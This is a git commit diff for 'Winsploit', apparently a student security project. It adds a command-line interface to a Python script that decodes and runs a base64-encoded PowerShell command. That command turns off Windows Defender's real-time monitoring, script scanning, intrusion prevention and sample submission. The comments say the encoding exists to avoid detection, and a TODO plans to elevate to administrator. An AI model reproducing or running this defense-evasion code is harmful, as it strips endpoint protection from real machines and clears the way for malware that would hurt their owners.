dec9b16d57f980c2e4c509c9a96664fd63823ff9
mario <mariomancev@tutanota.com>
2025-02-04 16:05:07 +0100

    feat: Click implentatie, fix: try/except, banner

--- week_1/main.py
+++ week_1/main.py
@@ -1,5 +1,3 @@
-#!/bin/python3
-
 import sys
 import subprocess
 import base64
@@ -8,14 +6,15 @@ import pyfiglet
 import random
 from banners import banner_list
 
+#Toon de prachtige banner
 def show_banner():
     selected_banner_ascii = random.choice(banner_list)
     version = 1.0
-
     complete_banner = f"{selected_banner_ascii}"
-    print(complete_banner)
+    click.echo(complete_banner)
     pyfiglet.print_figlet(f"Winsploit\nVer: {version}", font='rectangles')
-    print("\nLaurens Metz,\nThijs Vixseboxse,\nMario Mancev")
+    click.echo("\nLaurens Metz,\nThijs Vixseboxse,\nMario Mancev")
+
 # Functie voor het controlleren of het script op Windows wordt uitgevoerd.
 def check_os():
     if sys.platform == "win32":
@@ -23,25 +22,35 @@ def check_os():
     else:
         return False
 
-#functie voor het uitzetten van Windows Defender
+# Functie voor het uitzetten van Windows Defender
 def disable_win_defender():
     #base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
     disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZCAtRW5hYmxlTmV0d29ya1Byb3RlY3Rpb24gQXVkaXRNb2RlIC1Gb3JjZSAtTUFQU1JlcG9ydGluZyBEaXNhYmxlZCAtU3VibWl0U2FtcGxlc0NvbnNlbnQgTmV2ZXJTZW5kCg=="
     # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
-    subprocess.call(f"powershell.exe {base64.b64decode(disable_cmd_b64).strip().decode()}", shell=True)
+    try:
+        subprocess.call(f"powershell.exe {base64.b64decode(disable_cmd_b64).strip().decode()}", shell=True)
+    except Exception as e:
+        return f"Er ging iets mis: {e}"
 
+
+@click.command()
+@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable"]))
+# Disable is de enige fuctionaliteit voor nu...
 #Main functie
-def main():
+def main(action):
     show_banner()
-    if check_os():
-        try:
-            disable_win_defender()
-        except Exception as error:
-            print(f'er is een fout opgetreden: {error}')
-    else:
-        print(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {sys.platform}")
+    if not action:
+        action = click.prompt('Welke actie wil je uitvoeren?', type=click.Choice(["disable"]))
+    match action:
+        case "disable":
+        # Is dit een windows omgeving? 
+            if check_os():
+                click.echo(disable_win_defender())
+            else:
+                click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {sys.platform}")
 
 
 if __name__ == '__main__':
     main()
 
+# TODO: wachtwoord vragen en Powershell als administrator runnen
